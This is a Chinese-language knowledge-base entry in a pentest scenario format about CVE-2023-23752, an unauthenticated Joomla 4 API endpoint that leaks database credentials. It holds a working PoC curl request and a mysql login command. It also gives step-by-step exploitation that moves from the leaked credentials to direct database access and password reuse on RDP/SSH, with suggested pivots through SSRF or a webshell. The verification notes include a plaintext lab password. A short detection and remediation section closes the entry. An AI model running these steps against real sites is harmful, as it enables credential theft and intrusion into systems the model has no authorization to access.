---
id: web-php-joomla-api-config-application-public-db-credential-leak
title: Joomla 4 /api/index.php/v1/config/application?public=true 未授权泄露数据库账号口令（CVE-2023-23752）
type: scenario
domain: web
path: web/php
technique: webservice-config-endpoint-unauth-credential-disclosure
aliases:
- Joomla 未授权配置泄露
- CVE-2023-23752
- Joomla 数据库账号密码泄露
- /api/index.php/v1/config/application
- public=true
- Joomla Web Service API 信息泄露
tags:
- php
- joomla
- cve-2023-23752
- unauthenticated
- information-disclosure
- database-credential
- credential-reuse
cve:
- CVE-2023-23752
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V76
  verified_at: '2026-11-05T16:34:27+08:00'
  notes: 已对照原文与 img/01-10 核对：img/04 确认 /administrator 为 Joomla 后台；img/05 的 /api/index.php/v1/config/application?public=true 返回 dbtype=mysqli、host=localhost、user=root、password=cyberstrike@2025、db=joomla_db；img/06-09 Navicat 直连 3306、mysql.password 表读到 KK@2025、RDP administrator 登录并读 flag。原文未标注 Joomla 版本，未设置 affected_versions（正文 4.0.0-4.2.7/4.2.8 为 CVE 公开信息）。PoC 未执行。frontmatter 无 sources/source_url。
---

## 一句话结论

Joomla 4 的 Web Service API `/api/index.php/v1/config/application?public=true` 访问控制不严，未登录即可读取全局配置，直接泄露数据库主机、库名、用户名和明文口令；攻击者据此直连数据库，继续枚举凭据并复用至主机登录。

## 原理

- Joomla 4 引入 `/api/index.php/v1/...` 形式的 Web Service API，`com_config` 的 `application` 端点用于返回全局配置。
- 该端点本应要求相应权限，但 `public=true` 参数会走到错误的权限分支，使匿名请求也能拿到 `attributes` 中的配置项。
- 返回的 JSON 是 `data` 数组，每个元素形如 `{"type":"application","id":224,"attributes":{...}}`，其中包含 `dbtype`、`host`、`user`、`password`、`db`、`dbprefix`、`offline`、`debug` 等字段；数据库口令以明文存储并直接返回。
- 有了数据库地址与 root 级凭据，攻击者可以绕过 Joomla 应用层直接访问 MySQL，枚举 `joomla_db` 之外的库、用户表与自定义凭据表；如果该口令同时被运维复用到主机/远程桌面，就能从 Web 层横向到系统层。
- 这不是某个插件或弱口令问题，而是 API 鉴权缺失导致的配置与凭据泄露；公开影响范围为 Joomla 4.0.0–4.2.7，4.2.8 修复（原文未标注目标版本，此处为 CVE 公开信息）。

## 触发条件

- 目标为 Joomla 4.x（公开影响 4.0.0–4.2.7），且 Web Service API 未被 WAF/网关拦截。
- `/api/index.php/v1/config/application` 可访问，`public=true` 仍返回配置。
- 数据库监听可从攻击面访问（如 3306 对外），或能通过 SSRF/内网代理访问。
- 数据库账号具有跨库读取权限；若为最小权限应用账号，泄露价值下降。

## 利用步骤

1. 指纹识别 Joomla：访问首页/`/administrator`，或观察 `/api/index.php/v1/` 路由。
2. 请求配置端点：
   ```http
   GET /api/index.php/v1/config/application?public=true HTTP/1.1
   Host: target
   ```
3. 从 JSON 的 `data[].attributes` 中提取 `host`、`user`、`password`、`db`、`dbprefix`。
4. 用数据库客户端直连，确认权限；枚举其他数据库、用户表、配置表与自定义凭据表。
5. 把数据库中的口令与主机管理员、RDP/SSH、其他业务系统做复用尝试；若目标同时开放 3389/5985，可直接用泄露口令登录主机。
6. 若数据库口令不可复用，可尝试通过 Joomla 后台（拿到管理员口令哈希后破解/重置）进一步利用。

## PoC

```bash
curl -s 'http://target/api/index.php/v1/config/application?public=true' | jq '.data[].attributes'
```

```json
{
  "type": "application",
  "id": 224,
  "attributes": {
    "dbtype": "mysqli",
    "host": "localhost",
    "user": "root",
    "password": "<明文数据库口令>",
    "db": "joomla_db",
    "dbprefix": "uqbg3_"
  }
}
```

```bash
mysql -h target -P 3306 -u root -p'<明文数据库口令>' -e 'show databases;'
```

## 变体与关联

- 变体：同一访问控制缺陷下，其他 `/api/index.php/v1/` 端点也可能在 `public=true` 时匿名可读（如用户/内容相关端点），可批量探测。
- 变体：数据库仅监听 127.0.0.1 时，可结合目标上的 SSRF、phpMyAdmin、或先拿到的 WebShell 做本地连接。
- 变体：泄露的数据库口令常被复用到主机 Administrator/root、Redis、其他 CMS 后台；原文即在 MySQL 的自定义 `password` 表中读到主机口令并成功 RDP（该表是靶场构造，真实环境应枚举 `joomla_db` 用户表、配置文件与其他库）。
- 关联：[[web-php-wordpress-backup-sql-phpass-credential]]（CMS 配置/备份泄露凭据的同类思路）、[[pentest-recon-frontend-js-hardcoded-credentials]]（凭据泄露的另一种来源）、[[pentest-lateral-movement-psreadline-history-credential-harvest]]（凭据复用横向）。
- 边界：Joomla 已升级到 4.2.8+、API 被网关拦截、数据库账号为最小权限且口令未复用、数据库不对外时，后续利用受限。

## 检测与防御

- 检测：外网访问 `/api/index.php/v1/config/application` 且带 `public=true`；响应中出现 `dbtype`/`password` 等配置字段；数据库出现来自 Web 服务器网段的异常连接。
- 修复：升级 Joomla 至 4.2.8 或更高版本；在 nginx/WAF 层禁止外部访问 `/api/index.php/v1/config/`；数据库账号改为最小权限，禁止 root 远程登录。
- 加固：数据库口令与主机/其他系统口令不得复用；轮换已泄露凭据；限制 3306/3389/5985 等管理端口的来源；对 `/administrator` 与 API 做访问控制与告警。
